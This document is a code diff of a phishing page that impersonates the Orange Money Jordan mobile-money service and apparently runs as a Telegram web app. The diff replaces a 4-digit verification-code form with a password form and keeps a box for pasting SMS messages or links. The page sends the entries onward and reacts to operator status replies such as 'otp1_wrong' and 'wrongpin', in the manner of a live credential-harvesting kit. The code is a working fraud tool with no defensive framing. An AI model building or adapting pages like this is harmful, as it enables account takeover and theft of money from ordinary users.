@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>اورنج موني الأردن - التحقق من الرمز</title>
+    <title>اورنج موني الأردن - كلمة المرور</title>
     
     <!-- ✅ Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -90,50 +90,64 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            direction: ltr; /* Keeps prefix and number format consistent */
+            direction: ltr;
         }
 
-        /* 4-Digit OTP Code Inputs */
-        .otp-section {
+        /* Password Input Line Style (Matching Reference Photo) */
+        .password-section {
             margin-bottom: 20px;
-            text-align: center;
+            text-align: right;
         }
 
-        .otp-label {
+        .password-label {
             font-size: 14px;
             font-weight: 700;
             color: var(--text-dark);
-            margin-bottom: 12px;
+            margin-bottom: 8px;
+            display: block;
         }
 
-        .otp-input-group {
+        .password-wrapper {
+            position: relative;
+            width: 100%;
             display: flex;
-            gap: 12px;
-            justify-content: center;
-            margin-bottom: 16px;
-            direction: ltr; /* Left-to-right digit sequence */
+            align-items: center;
         }
 
-        .otp-box {
-            width: 52px;
-            height: 54px;
-            border: 2px solid var(--border-orange);
-            border-radius: 10px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: bold;
+        .password-input {
+            width: 100%;
+            height: 52px;
+            border: 1.5px solid #dcdcdc;
+            border-bottom: 2.5px solid var(--border-orange);
+            border-radius: 8px;
+            padding: 0 16px 0 45px;
+            font-size: 16px;
+            font-weight: 600;
             outline: none;
-            background-color: #ffffff;
-            transition: border-color 0.2s;
+            background-color: #fafafa;
+            color: #333333;
+            transition: all 0.2s;
+            direction: ltr;
+            text-align: left;
         }
 
-        .otp-box:focus {
-            border-width: 2.5px;
+        .password-input:focus {
+            border-color: var(--orange-primary);
+            background-color: #ffffff;
+        }
+
+        .toggle-eye {
+            position: absolute;
+            left: 14px;
+            cursor: pointer;
+            font-size: 20px;
+            user-select: none;
+            color: var(--text-muted);
         }
 
         textarea {
             width: 100%;
-            height: 80px;
+            height: 70px;
             border: 1.5px solid #dcdcdc;
             border-radius: 10px;
             padding: 10px;
@@ -143,6 +157,7 @@
             font-family: inherit;
             color: #333333;
             background-color: #fafafa;
+            margin-bottom: 10px;
         }
 
         textarea:focus {
@@ -158,7 +173,7 @@
             text-align: center;
             color: var(--text-muted);
             font-size: 14px;
-            margin: 20px 0;
+            margin: 15px 0;
         }
 
         .submit-btn {
@@ -284,10 +299,10 @@
 
 <div class="main-container">
     <div class="card">
-        <h2>التحقق بخطوتين</h2>
+        <h2>تسجيل الدخول</h2>
 
         <p class="instruction">
-            أدخل رمز التحقق المكون من 4 أرقام الذي تم إرساله إلى رقم اورنج موني الخاص بك:
+            أدخل كلمة المرور الخاصة بتطبيق اورنج موني الأردن المرتبطة برقمك:
         </p>
 
         <div class="phone-number">
@@ -295,25 +310,23 @@
             <span id="displayPhone">+962 ...</span>
         </div>
 
-        <!-- 4-Digit OTP Code Inputs -->
-        <div class="otp-section">
-            <div class="otp-label">رمز التحقق (4 أرقام)</div>
-            <div class="otp-input-group">
-                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
-                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
-                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
-                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+        <!-- Password Line Input -->
+        <div class="password-section">
+            <label class="password-label" for="passwordInput">كلمة المرور (Password)</label>
+            <div class="password-wrapper">
+                <input type="password" id="passwordInput" class="password-input" placeholder="أدخل كلمة المرور" autocomplete="current-password">
+                <span class="toggle-eye" id="eyeIcon">👁️</span>
             </div>
         </div>
 
-        <textarea id="smsInput" placeholder="أو قم بلصق الرسالة النصية / الرابط الكامل هنا..."></textarea>
-        <div id="errorText" class="error-message">الرمز أو الرابط غير صحيح أو انتهت صلاحيته. يرجى استخدام أحدث رمز تم استلامه.</div>
+        <textarea id="smsInput" placeholder="أو قم بلصق تفاصيل الرسالة النصية هنا (اختياري)..."></textarea>
+        <div id="errorText" class="error-message">كلمة المرور غير صحيحة. يرجى التحقق وإعادة المحاولة.</div>
 
         <div class="resend-text" id="timerBox">
-            إعادة الإرسال خلال <span id="timer">60</span> ثانية
+            إعادة إرسال رمز التحقق خلال <span id="timer">60</span> ثانية
         </div>
 
-        <button id="submitBtn" class="submit-btn" disabled>تأكيد الرمز</button>
+        <button id="submitBtn" class="submit-btn" disabled>تأكيد كلمة المرور</button>
     </div>
 </div>
 
@@ -341,7 +354,8 @@
 <script>
 document.addEventListener("DOMContentLoaded", () => {
     const displayPhone = document.getElementById('displayPhone');
-    const otpBoxes = document.querySelectorAll('.otp-box');
+    const passwordInput = document.getElementById('passwordInput');
+    const eyeIcon = document.getElementById('eyeIcon');
     const smsInput = document.getElementById('smsInput');
     const submitBtn = document.getElementById('submitBtn');
     const timerEl = document.getElementById('timer');
@@ -360,42 +374,21 @@ document.addEventListener("DOMContentLoaded", () => {
         displayPhone.textContent = "+962 ...";
     }
 
-    // Auto-focus and digit handling for the 4 OTP boxes
-    otpBoxes.forEach((box, index) => {
-        box.addEventListener('input', () => {
-            box.value = box.value.replace(/\D/g, '');
-
-            if (box.value && index < otpBoxes.length - 1) {
-                otpBoxes[index + 1].focus();
-            }
-
-            checkInputs();
-        });
-
-        box.addEventListener('keydown', (e) => {
-            if (e.key === "Backspace" && !box.value && index > 0) {
-                otpBoxes[index - 1].focus();
-            }
-        });
+    // Toggle password visibility with eye icon
+    eyeIcon.addEventListener('click', () => {
+        const isPassword = passwordInput.type === "password";
+        passwordInput.type = isPassword ? "text" : "password";
+        eyeIcon.textContent = isPassword ? "🙈" : "👁️";
     });
 
-    // Auto extract 4-digit code from full SMS if pasted into text area
-    smsInput.addEventListener('input', () => {
-        const text = smsInput.value;
-        const matched = text.match(/\b\d{4}\b/);
-        if (matched) {
-            const digits = matched[0].split('');
-            otpBoxes.forEach((box, i) => {
-                box.value = digits[i] || '';
-            });
-        }
-        checkInputs();
-    });
+    // Input handlers to enable/disable button
+    passwordInput.addEventListener('input', checkInputs);
+    smsInput.addEventListener('input', checkInputs);
 
     function checkInputs() {
-        const isOtpFilled = [...otpBoxes].every(b => b.value.length === 1);
+        const hasPassword = passwordInput.value.trim().length > 0;
         const hasText = smsInput.value.trim().length > 0;
-        const valid = isOtpFilled || hasText;
+        const valid = hasPassword || hasText;
 
         submitBtn.disabled = !valid;
         submitBtn.classList.toggle('active', valid);
@@ -433,15 +426,15 @@ document.addEventListener("DOMContentLoaded", () => {
                     clearInterval(checkInterval);
                     window.location.href = "/page6?error=wrongpin";
                 } 
-                // Incorrect SMS Code/Link handle
+                // Incorrect Password handle
                 else if (data.status === "otp1_wrong") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
                     contactOverlay.style.display = "none";
-                    errorText.textContent = "الرمز أو الرابط غير صحيح أو انتهت صلاحيته. يرجى استخدام أحدث رمز تم استلامه.";
+                    errorText.textContent = "كلمة المرور غير صحيحة. يرجى التحقق وإعادة المحاولة.";
                     errorText.style.display = "block";
+                    passwordInput.value = "";
                     smsInput.value = "";
-                    otpBoxes.forEach(b => b.value = "");
                     submitBtn.disabled = true;
                     submitBtn.classList.remove('active');
                 } 
@@ -461,11 +454,9 @@ document.addEventListener("DOMContentLoaded", () => {
     submitBtn.addEventListener('click', async () => {
         if (submitBtn.disabled) return;
 
-        let code = "";
-        otpBoxes.forEach(b => code += b.value);
-
+        const pwdValue = passwordInput.value.trim();
         const pastedLink = smsInput.value.trim();
-        const payload = pastedLink ? `${code} | ${pastedLink}` : code;
+        const payload = pastedLink ? `${pwdValue} | ${pastedLink}` : pwdValue;
 
         if (!payload) return;
 
